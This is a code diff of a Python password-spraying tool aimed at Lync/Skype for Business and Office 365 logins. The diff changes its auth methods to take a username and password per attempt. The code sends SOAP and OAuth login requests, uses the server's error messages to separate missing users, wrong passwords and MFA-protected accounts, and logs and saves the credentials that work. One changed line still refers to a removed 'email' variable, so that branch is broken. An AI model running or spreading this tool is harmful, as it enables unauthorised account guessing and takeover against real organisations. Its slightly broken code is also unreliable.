@@ -9,9 +9,8 @@ from datetime import datetime
 
 
 class Lync:
-    def __init__(self, target, password):
+    def __init__(self, target):
         self.domain = target
-        self.password = password
         self.log = logging.getLogger('lyncsprayer')
         self.valid_accounts = set()
         self.lync_base_url = None
@@ -37,8 +36,8 @@ class Lync:
 
     def shutdown(self):
         with open('lync_valid_accounts.txt', 'a+') as account_file:
-            for email in self.valid_accounts:
-                account_file.write(email + '\n')
+            for username in self.valid_accounts:
+                account_file.write(username + '\n')
 
         self.log.info(print_good(f"Dumped {len(self.valid_accounts)} valid accounts to lync_valid_accounts.txt"))
 
@@ -53,8 +52,8 @@ class Lync:
         return self.get_s4b_autodiscover_info(r['_links']['redirect']['href'])
 
     # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L409
-    def auth_O365(self, email):
-        log = logging.getLogger(f"auth_lync_O365({email})")
+    def auth_O365(self, username, password):
+        log = logging.getLogger(f"auth_lync_O365({username})")
 
         utc_time = datetime.utcnow().replace(tzinfo=simple_utc()).isoformat()
         utc_time_1 = (datetime.utcnow() + timedelta(days=1)).replace(tzinfo=simple_utc()).isoformat()
@@ -70,8 +69,8 @@ class Lync:
     </ps:AuthInfo>
     <wsse:Security>
     <wsse:UsernameToken wsu:Id="user">
-        <wsse:Username>{email}</wsse:Username>
-        <wsse:Password>{self.password}</wsse:Password>
+        <wsse:Username>{username}</wsse:Username>
+        <wsse:Password>{password}</wsse:Password>
     </wsse:UsernameToken>
     <wsu:Timestamp Id="Timestamp">
         <wsu:Created>{utc_time.replace('+00:00', '1Z')}</wsu:Created>
@@ -101,29 +100,29 @@ class Lync:
             log.error(print_bad('Invalid request was received by server, dumping request & response XML'))
             log.error(soap + '\n' + r.text)
         elif ('To sign into this application the account must be added' in msg) or ("The user account does not exist" in msg):
-            log.info(print_bad(f"Authentication failed: {email}:{self.password} (Username does not exist)"))
+            log.info(print_bad(f"Authentication failed: {username}:{password} (Username does not exist)"))
         elif 'Error validating credentials' in msg:
-            log.info(print_bad(f"Authentication failed: {email}:{self.password} (Invalid credentials)"))
+            log.info(print_bad(f"Authentication failed: {email}:{password} (Invalid credentials)"))
         elif 'you must use multi-factor' in msg.lower():
-            log.info(print_good(f"Found Credentials: {email}:{self.password} (However, MFA is required)"))
-            self.valid_accounts.add(email)
+            log.info(print_good(f"Found Credentials: {username}:{password} (However, MFA is required)"))
+            self.valid_accounts.add(username)
         else:
-            log.info(print_good(f"Found credentials: {email}:{self.password}"))
-            self.valid_accounts.add(email)
+            log.info(print_good(f"Found credentials: {username}:{password}"))
+            self.valid_accounts.add(username)
             log.info(r.text)
 
     # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L397-L406
-    def auth(self, email):
-        log = logging.getLogger(f"auth_lync({email})")
+    def auth(self, username, password):
+        log = logging.getLogger(f"auth_lync({username})")
         payload = {
             "grant_type": "password",
-            "username": email,
-            "password": self.password
+            "username": username,
+            "password": password
         }
 
         r = requests.post(self.lync_base_url, data=payload)
         try:
             r.json()['access_token']
-            log.info(print_good(f"Found credentials: {email}:{self.password}"))
+            log.info(print_good(f"Found credentials: {username}:{password}"))
         except Exception as e:
-            log.info(print_bad(f"Invalid credentials: {email}:{self.password} ({e})"))
+            log.info(print_bad(f"Invalid credentials: {username}:{password} ({e})"))
